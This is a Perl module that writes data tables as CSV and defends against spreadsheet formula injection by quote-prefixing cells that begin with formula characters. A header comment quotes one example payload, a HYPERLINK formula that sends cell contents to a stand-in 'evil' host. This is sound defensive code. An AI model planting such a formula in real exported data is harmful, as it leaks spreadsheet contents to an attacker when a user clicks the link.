package Lazysite::Data::Csv;

# DM-2: a table as CSV, for the spreadsheet an operator actually works in.
#
# CSV IS THE LOSSY ONE, AND THAT IS WHY THE TYPED JSON EXPORT EXISTS BESIDE IT.
# CSV has no types, no null, and no way to say "this decimal has two places".
# It is offered because a person with a spreadsheet is a real user with a real
# need, not because it is a good interchange format - and the docs say which
# one to use when you want the data BACK.
#
# THE FORMULA GUARD, AND WHAT IT COSTS.
#
# A spreadsheet treats a cell beginning `=`, `+`, `-`, `@`, tab or carriage
# return as a FORMULA, not text. So a row containing
#
#     =HYPERLINK("http://evil/?"&A1,"Click me")
#
# becomes executable content the moment somebody opens the file - and rows can
# arrive from a public form (DP-4), which means an anonymous visitor could put
# it there. Quoting does not help: Excel parses `="..."` after unquoting.
#
# The accepted mitigation is to prefix such a cell with a single quote, and it
# is worth being plain that THIS CHANGES THE VALUE. The cell reads `'=x` rather
# than `=x`; a spreadsheet hides the quote and shows the text, but a program
# reading the CSV sees the extra character. That is the trade: a download that
# is exact and dangerous, or one that is safe and marked. For anything that has
# to round-trip, use the typed JSON export, which alters nothing.
#
# Every guarded cell is also COUNTED, so the caller can say how many were
# changed instead of leaving somebody to discover it in a diff.

use strict;
use warnings;
use Exporter 'import';

our @EXPORT_OK = qw(to_csv csv_columns);

# The characters a spreadsheet reads as "this is a formula".
my $DANGEROUS = qr/\A[=+\-\@\t\r]/;

# The columns, in the order a person expects to meet them: the key first,
# because it is what identifies the row, then the declared fields. Taken from
# the DESCRIPTOR rather than from the rows - a column no row has filled is
# still a column, and a header that appears and disappears with the data is
# worse than a wide file.
sub csv_columns {
    my ($d)  = @_;
    my @cols = sort keys %{ $d->{fields} || {} };
    my $key  = $d->{key};
    if ( defined $key && !$d->{auto_key} ) {
        @cols = ( $key, grep { $_ ne $key } @cols );
    }
    elsif ( defined $key ) {
        unshift @cols, $key;    # the automatic id is a real column in the store
    }
    if ( $d->{timestamps} ) { push @cols, 'created_at', 'updated_at' }
    return @cols;
}

sub _cell {
    my ( $v, $guarded ) = @_;

    # NULL AND EMPTY BOTH BECOME AN EMPTY FIELD, because CSV cannot tell them
    # apart and pretending otherwise would invent a convention every reader
    # would guess at differently. It is one of the things the format loses, and
    # the docs name it.
    return '' unless defined $v;

    $v = "$v";
    if ( $v =~ $DANGEROUS ) {
        $v = "'" . $v;
        ${$guarded}++;
    }

    # RFC 4180: quote when the value contains a comma, a quote or a newline,
    # and double any embedded quote.
    if ( $v =~ /[",\r\n]/ ) {
        $v =~ s/"/""/g;
        $v = '"' . $v . '"';
    }
    return $v;
}

# Returns ( $csv_text, $guarded_count ).
sub to_csv {
    my ( $d, $rows ) = @_;
    die 'to_csv needs a loaded descriptor' unless ref $d eq 'HASH' && $d->{ok};

    my @cols    = csv_columns($d);
    my $guarded = 0;

    # The header goes through the same guard as the data. A field named `-name`
    # is legal nowhere in this system, but the header is a row like any other
    # and treating it specially is how one path gets forgotten.
    my @out = ( join ',', map { _cell( $_, \$guarded ) } @cols );

    for my $r ( @{ $rows || [] } ) {
        push @out, join ',', map { _cell( $r->{$_}, \$guarded ) } @cols;
    }

    # CRLF per RFC 4180, and a trailing one: a file whose last line has no
    # terminator is the kind of thing that reads fine everywhere except the one
    # tool somebody uses.
    return ( join( "\r\n", @out ) . "\r\n", $guarded );
}

1;
